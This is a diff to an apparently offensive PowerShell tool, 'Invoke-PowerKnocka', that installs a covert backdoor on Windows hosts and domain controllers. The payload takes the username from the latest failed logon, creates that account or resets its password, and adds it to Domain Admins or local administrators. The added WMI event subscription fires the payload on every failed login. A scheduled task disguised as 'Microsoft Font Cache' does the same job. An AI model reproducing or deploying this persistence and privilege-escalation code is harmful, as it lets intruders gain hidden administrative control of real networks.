@@ -6,7 +6,7 @@ function Invoke-PowerKnocka {
         [string]$Method,
 
         [Parameter(Mandatory=$false)]
-        [string]$TaskName = "Microsoft Font Cache",
+        [string]$Name = "Microsoft Font Cache",
 
         [Parameter(Mandatory=$false)]
         [string]$TaskDesription = "Default task to refresh the font cache service",
@@ -25,10 +25,14 @@ function Invoke-PowerKnocka {
     )
 
     if ($DC) {
-        $ExploitString = "$e = Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString $Password -AsPlainText -force);Add-ADGroupMember -Identity 'Domain Admins' -Members $n"
+        $ExploitString = {
+            $e = Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];if (Get-ADUser -Identity $n) {Set-ADAccountPassword -Identity $n -Reset -NewPassword (ConvertTo-SecureString -AsPlainText $Password -Force)} else {New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString $Password -AsPlainText -force);Add-ADGroupMember -Identity 'Domain Admins' -Members $n}
+        }
     }
     else {
-        $ExploitString = "$e = Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];net user $n $Password;net localgroup administrators $n /add"
+        $ExploitString = {
+            $e = Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];if (net user $n) {net user $n $Password} else {net user $n $Password /add;net localgroup administrators $n /add}
+        }
     }
 
     if ($ClearLog) {
@@ -59,7 +63,37 @@ function Invoke-PowerKnocka {
         Register-ScheduledTask @RegSchTaskParameters
     } 
     elseif ($Method -eq "WMI") {
+        # WMI __EVENTFILTER
+        $wmiParams = @{
+            ErrorAction = 'Stop'
+            NameSpace = 'root\subscription'
+        }
 
+        $wmiParams.Class = '__EventFilter'
+        $wmiParams.Arguments = @{
+            Name = $Name
+            EventNamespace = 'root\CIMV2'
+            QueryLanguage = 'WQL'
+            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '4625'"
+        }
+        $filterResult = Set-WmiInstance @wmiParams
+
+        # WMI __EVENTCONSUMER
+        $wmiParams.Class = 'CommandLineEventConsumer'
+        $wmiParams.Arguments = @{
+            Name = $Name
+            CommandLineTemplate = $ExploitString
+        }
+        $consumerResult = Set-WmiInstance @wmiParams
+
+        #WMI __FILTERTOCONSUMERBINDING
+        $wmiParams.Class = '__FilterToConsumerBinding'
+        $wmiParams.Arguments = @{
+            Filter = $filterResult
+            Consumer = $consumerResult
+        }
+
+        Set-WmiInstance @wmiParams
     } 
     else {
         Write-Host "[Error] Invalid Method, exiting" -ForegroundColor Red
